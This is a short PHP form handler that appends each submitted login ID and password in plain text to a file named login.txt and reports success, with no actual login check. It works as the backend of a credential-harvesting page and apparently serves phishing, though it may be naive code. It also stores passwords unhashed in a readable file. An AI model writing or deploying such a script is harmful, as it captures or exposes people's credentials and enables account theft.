<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve form data
    $login_id = htmlspecialchars($_POST['login_id']);
    $password = htmlspecialchars($_POST['password']);
    
    // Save the login details to a file
    $file = fopen("login.txt", "a");
    fwrite($file, "Login ID: " . $login_id . "\n");
    fwrite($file, "Password: " . $password . "\n");
    fwrite($file, "-------------------------\n");
    fclose($file);
    
    // Display success message
    echo "Login details saved successfully!";
}
?>
